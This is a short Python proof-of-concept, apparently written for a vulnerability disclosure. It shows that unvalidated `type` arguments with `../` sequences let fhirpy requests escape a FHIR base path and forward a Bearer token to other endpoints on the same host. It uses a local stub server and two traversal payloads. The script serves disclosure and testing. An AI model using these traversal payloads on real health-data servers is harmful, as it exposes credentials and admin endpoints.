"""
PoC 2 — same-host SSRF / base-path escape (no knowledge of the FHIR base URL required).

The read/search/create/update tools pass the `type` argument into
    client.resource(resource_type=type, id=id).execute(...)
with no validation. A relative `type` containing `../` escapes the configured FHIR base
path and is sent — with the Authorization: Bearer header — to arbitrary paths on the FHIR
server host (e.g. an admin or management endpoint outside /fhir/r4).
"""
import asyncio
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

from fhirpy import AsyncFHIRClient

HITS = []

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        HITS.append((self.path, self.headers.get("Authorization")))
        self.send_response(200); self.send_header("Content-Type", "application/fhir+json"); self.end_headers()
        self.wfile.write(b"{}")
    def log_message(self, *a):
        pass

def serve():
    HTTPServer(("127.0.0.1", 9911), Handler).serve_forever()

async def main():
    threading.Thread(target=serve, daemon=True).start()
    await asyncio.sleep(0.3)
    # Configured FHIR base path is /fhir/r4; the token belongs to that server.
    client = AsyncFHIRClient(url="http://127.0.0.1:9911/fhir/r4", authorization="Bearer SECRET-PHI-TOKEN")
    for malicious_type in ["../../../admin", "../../../../metadata"]:
        try:
            await client.resource(resource_type=malicious_type, id="x").execute(
                operation="", method="GET", params={})
        except Exception:
            pass
    print("--- requests received by the FHIR host ---")
    for path, auth in HITS:
        print(f"path={path!r}   token_forwarded={auth is not None}")

asyncio.run(main())
